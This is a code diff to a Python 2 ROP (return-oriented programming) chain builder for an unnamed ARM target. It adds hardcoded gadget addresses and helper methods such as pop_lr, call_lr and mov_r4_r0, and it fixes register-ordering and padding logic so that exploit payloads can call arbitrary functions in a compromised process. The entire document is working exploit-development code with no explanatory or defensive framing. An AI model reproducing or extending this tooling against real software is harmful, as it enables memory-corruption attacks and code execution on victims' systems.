@@ -23,7 +23,9 @@ _pop_r1_pc = 0x001C4FC4 #0x001549E1
 _pop_r2_pc = 0x0022952D
 _pop_r3_pc = 0x0010538C
 _pop_r4_pc = 0x001001ED #0x001B3AA0
-_pop_r4_r12_pc = 0x0018D5DC
+_pop_r1_r5_r6_pc = 0x001F1075
+_pop_r4_to_r12_pc = 0x0018D5DC
+_pop_r4_lr_bx_r2 = 0x001D9360
 # Loads and stores.
 _ldr_r0_r0_pop_r4_pc = 0x0012FBBC
 _str_r1_r0_pop_r4_pc = 0x0010CCBC
@@ -39,7 +41,8 @@ class Ref:
 
 class Data:
 	def __init__(self, _data):
-		self.data = _data.ljust(4, "\x00")
+		m = len(_data) % 4
+		self.data = (_data + "\x00" * (4 - m) if m else _data)
 
 class ROP:
 	def __init__(self, _base):
@@ -89,21 +92,34 @@ class ROP:
 		self._append(_pop_r4_pc)
 		self._append(r4)
 
+	def pop_r1_r5_r6(self, r1, r5, r6):
+		self._append(_pop_r1_r5_r6_pc)
+		self._append(r1)
+		self._append(r5)
+		self._append(r6)
+
 	def pop_rX(self, **kwargs):
-		regs = {
-			'r4' : 0x44444444, 'r5' : 0x55555555, 'r6' : 0x66666666, 
-			'r7' : 0x77777777, 'r8' : 0x88888888, 'r9' : 0x99999999, 
-			'r10' : 0xAAAAAAAA, 'r11' : 0xBBBBBBBB, 'r12' : 0xCCCCCCCC
-		}
+		regs = ['r4', 'r5', 'r6', 'r7', 'r8', 'r9', 'r10', 'r11', 'r12']
+		values = [
+			0x44444444, 0x55555555, 0x66666666, 
+			0x77777777, 0x88888888, 0x99999999, 
+			0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC
+		]
 		for k, v in kwargs.items():
 			if k not in regs:
 				print "Wat? ({0})".format(k)
 				return
 			else:
-				regs[k] = v
-		self._append(_pop_r4_r12_pc)
-		for _, v in regs.items():
+				values[int(k[1:]) - 4] = v
+		self._append(_pop_r4_to_r12_pc)
+		for v in values:
 			self._append(v)
+
+	def pop_lr(self, addy):
+		self.pop_r2(_pop_pc)
+		self._append(_pop_r4_lr_bx_r2)
+		self._append(0x44444444)
+		self._append(addy)
 
 	def load_r0(self, addy):
 		self.pop_r0(addy)
@@ -130,6 +146,22 @@ class ROP:
 		self._append(fun)
 		for i in xrange(cleancnt):
 			self._append(0xDEADBEEF)
+
+	def call_lr(self, fun, args):
+		pops = [_pop_r0_pc, _pop_r1_pc, _pop_r2_pc, _pop_r3_pc]
+		if len(args) > 4:
+			print "Nahhhh, not now, maybe later ({0})".format(args)
+			return
+		self.pop_lr(_pop_pc)
+		for i in xrange(len(args)):
+			self._append(pops[i])
+			self._append(args[i])
+		self._append(fun)
+
+	def mov_r4_r0(self):
+		# 0x001B4F0C: adds r4, r0, r5; subs r4, r4, r7; movs r0, r4; blx r6
+		self.pop_rX(r5 = 0, r6 = _pop_pc, r7 = 0)
+		self._append(0x1B4F0D)
 
 #	def memcpy(self, dst, src, size):
 #		self.call(_memcpy, [dst, src, size], 7)
